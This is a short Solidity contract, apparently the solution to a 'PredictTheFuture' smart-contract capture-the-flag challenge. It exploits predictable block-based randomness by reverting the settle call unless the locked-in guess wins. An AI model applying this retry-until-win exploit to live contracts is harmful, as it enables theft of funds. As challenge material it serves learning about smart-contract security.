// SPDX-License-Identifier: MIT

pragma solidity ^0.4.21;
import "./8.sol";

contract PredictTheFutureSolution {
    PredictTheFutureChallenge public challenge;
    uint8 public guess;

    function PredictTheFutureSolution(address chAddress) public payable {
        challenge = PredictTheFutureChallenge(chAddress);
    }

    function lockInGuess(uint8 n) public payable {
        require(msg.value == 1 ether);
        guess = n;
        challenge.lockInGuess.value(1 ether)(guess);
    }

    function setGuess(uint8 n) public {
        guess = n;
    }

    function settle_last() public {
        challenge.settle();
        msg.sender.transfer(address(this).balance);
    }

    function settle() public {
        challenge.settle();
        require(challenge.isComplete());
        msg.sender.transfer(address(this).balance);
    }

    function () public payable {}
}